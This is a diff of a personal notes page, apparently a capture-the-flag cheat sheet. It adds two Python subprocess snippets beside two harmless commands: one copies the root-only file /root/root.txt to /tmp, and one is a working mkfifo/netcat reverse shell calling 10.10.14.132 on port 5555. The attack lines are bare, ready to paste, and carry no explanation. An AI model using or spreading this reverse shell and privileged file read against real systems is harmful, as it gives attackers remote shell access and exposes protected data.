@@ -37,9 +37,15 @@
           <a class="tag" href="https://sosprz.github.io/tags/python/">Python</a></div></div>
     </header>
     <div class="post-content">
-      <p><pre><code>cat users.txt | python -m json.tool</pre></code></p>
+      <pre><code>cat users.txt | python -m json.tool</pre></code>
 
-<p><pre><code>python -m SimpleHTTPServer 8000</pre></code></p>
+<pre><code>python -m SimpleHTTPServer 8000</pre></code>
+
+<pre>from subprocess import call
+call('cat /root/root.txt > /tmp/output', shell=True)</pre>
+
+<pre>from subprocess import call
+call('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.132 5555 >/tmp/f', shell=True)</pre>
 
     </div>
   </article>
